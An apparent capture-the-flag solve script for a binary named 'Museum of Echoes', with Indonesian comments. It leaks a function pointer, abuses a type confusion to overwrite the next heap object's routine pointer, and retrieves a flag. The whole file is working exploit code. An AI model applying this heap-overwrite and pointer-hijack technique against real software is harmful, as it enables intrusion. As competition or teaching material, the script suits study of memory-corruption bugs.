#!/usr/bin/env python3

import argparse
import os
import re
import select
import socket
import struct
import subprocess
import sys
import time
from pathlib import Path

BASE = Path(__file__).resolve().parent
BIN = BASE / "museum_of_echoes"

WHISPER_PERFORM_OFFSET = 0x11F9
GRAND_FINALE_OFFSET = 0x12B3
MAGIC = 0x4543484F

FLAG_RE = re.compile(rb"grodno\{[^\r\n}]+\}")


def p64(value: int) -> bytes:
    return struct.pack("<Q", value)


class Tube:
    def recv(self, size: int = 4096, timeout: float = 5.0) -> bytes:
        raise NotImplementedError

    def send(self, data: bytes) -> None:
        raise NotImplementedError

    def close(self) -> None:
        pass

    def recvuntil(self, token: bytes, timeout: float = 5.0) -> bytes:
        data = bytearray()
        deadline = time.monotonic() + timeout

        while token not in data:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                raise TimeoutError(
                    f"timeout menunggu {token!r}; data={bytes(data)!r}"
                )

            chunk = self.recv(4096, remaining)
            if not chunk:
                raise EOFError(bytes(data))
            data += chunk

        return bytes(data)

    def recvall(self, timeout: float = 3.0) -> bytes:
        data = bytearray()
        deadline = time.monotonic() + timeout

        while True:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                break

            try:
                chunk = self.recv(4096, remaining)
            except TimeoutError:
                break

            if not chunk:
                break

            data += chunk
            deadline = time.monotonic() + timeout

        return bytes(data)

    def sendline(self, data: bytes | str) -> None:
        if isinstance(data, str):
            data = data.encode()
        self.send(data + b"\n")


class RemoteTube(Tube):
    def __init__(self, host: str, port: int):
        self.sock = socket.create_connection((host, port), timeout=5.0)

    def recv(self, size: int = 4096, timeout: float = 5.0) -> bytes:
        self.sock.settimeout(timeout)
        try:
            return self.sock.recv(size)
        except socket.timeout as exc:
            raise TimeoutError from exc

    def send(self, data: bytes) -> None:
        self.sock.sendall(data)

    def close(self) -> None:
        try:
            self.sock.close()
        except OSError:
            pass


class ProcessTube(Tube):
    def __init__(self, argv: list[str], cwd: Path):
        self.proc = subprocess.Popen(
            argv,
            cwd=str(cwd),
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            bufsize=0,
        )

    def recv(self, size: int = 4096, timeout: float = 5.0) -> bytes:
        assert self.proc.stdout is not None
        fd = self.proc.stdout.fileno()
        readable, _, _ = select.select([fd], [], [], timeout)
        if not readable:
            raise TimeoutError
        return os.read(fd, size)

    def send(self, data: bytes) -> None:
        assert self.proc.stdin is not None
        self.proc.stdin.write(data)
        self.proc.stdin.flush()

    def close(self) -> None:
        if self.proc.poll() is None:
            self.proc.kill()
        try:
            self.proc.wait(timeout=1)
        except subprocess.TimeoutExpired:
            pass


def start(host: str | None, port: int | None) -> Tube:
    if host is not None and port is not None:
        return RemoteTube(host, port)

    if not BIN.exists():
        raise FileNotFoundError(f"binary tidak ditemukan: {BIN}")

    return ProcessTube([str(BIN)], BASE)


def sync_menu(io: Tube) -> None:
    io.recvuntil(b"> ")


def create_whisper(io: Tube, slot: int, line: bytes) -> None:
    io.sendline("1")
    io.recvuntil(b"Slot:\n")
    io.sendline(str(slot))
    io.recvuntil(b"Kind (1=whisper, 2=chorus):\n")
    io.sendline("1")
    io.recvuntil(b"Line:\n")
    io.send(line)
    io.recvuntil(b"> ")


def inspect(io: Tube, slot: int) -> bytes:
    io.sendline("4")
    io.recvuntil(b"Slot:\n")
    io.sendline(str(slot))
    return io.recvuntil(b"> ")


def reclassify(io: Tube, slot: int, new_kind: int) -> None:
    io.sendline("3")
    io.recvuntil(b"Slot:\n")
    io.sendline(str(slot))
    io.recvuntil(b"New kind (1=whisper, 2=chorus):\n")
    io.sendline(str(new_kind))
    output = io.recvuntil(b"> ")

    if b"Exhibit reclassified." not in output:
        raise RuntimeError(f"reclassify gagal: {output!r}")


def rewrite_as_chorus(io: Tube, slot: int, intro: bytes, refrain: bytes) -> None:
    io.sendline("2")
    io.recvuntil(b"Slot:\n")
    io.sendline(str(slot))
    io.recvuntil(b"New intro:\n")
    io.send(intro)
    io.recvuntil(b"New refrain:\n")
    io.send(refrain)
    io.recvuntil(b"> ")


def perform(io: Tube, slot: int) -> bytes:
    io.sendline("5")
    io.recvuntil(b"Slot:\n")
    io.sendline(str(slot))
    return io.recvall(timeout=3.0)


def exploit(io: Tube) -> bytes:
    sync_menu(io)

    # Dua whisper berukuran 0x50 dialokasikan berurutan.
    create_whisper(io, 0, b"A\n")
    create_whisper(io, 1, b"B\n")

    # Inspect membocorkan pointer fungsi whisper_perform.
    leak_output = inspect(io, 1)
    match = re.search(rb"Routine: (0x[0-9a-fA-F]+)", leak_output)
    if not match:
        raise RuntimeError(f"routine leak tidak ditemukan: {leak_output!r}")

    routine_leak = int(match.group(1), 16)
    grand_finale = routine_leak + 0x72

    print(f"[+] whisper_perform : {routine_leak:#x}")
    print(f"[+] grand_finale    : {grand_finale:#x}")

    # Reclassify hanya mengganti field kind dan routine tanpa realloc.
    # Object slot 0 tetap berukuran whisper (request 0x50), tetapi rewrite
    # kini memperlakukannya sebagai chorus dan menulis refrain dari +0x50.
    reclassify(io, 0, 2)

    # Layout dari awal chorus->refrain (slot 0 + 0x50):
    #   +0x00 next chunk prev_size
    #   +0x08 next chunk size
    #   +0x10 slot 1 kind + padding
    #   +0x18 slot 1 magic
    #   +0x20 slot 1 routine
    payload = b"".join(
        [
            p64(0),
            p64(0x61),
            p64(1),
            p64(MAGIC),
            p64(grand_finale),
        ]
    )

    if len(payload) != 0x28:
        raise AssertionError("panjang payload salah")

    rewrite_as_chorus(io, 0, b"I\n", payload)

    # perform_exhibit memvalidasi magic slot 1 lalu memanggil routine(slot1).
    return perform(io, 1)


def main() -> int:
    parser = argparse.ArgumentParser(description="Museum of Echoes exploit")
    parser.add_argument("host", nargs="?")
    parser.add_argument("port", nargs="?", type=int)
    args = parser.parse_args()

    if (args.host is None) != (args.port is None):
        parser.error("pakai: python3 solve.py HOST PORT")

    io = None
    try:
        io = start(args.host, args.port)
        result = exploit(io)
        sys.stdout.buffer.write(result)
        sys.stdout.buffer.flush()

        flag = FLAG_RE.search(result)
        if flag:
            decoded = flag.group(0).decode()
            print(f"\n<FLAG>{decoded}</FLAG>")
            return 0

        print("[-] grand_finale terpanggil, tetapi flag tidak ditemukan", file=sys.stderr)
        return 1

    except (OSError, EOFError, TimeoutError, RuntimeError, ValueError) as exc:
        print(f"[-] exploit gagal: {exc}", file=sys.stderr)
        return 1

    finally:
        if io is not None:
            io.close()


if __name__ == "__main__":
    raise SystemExit(main())
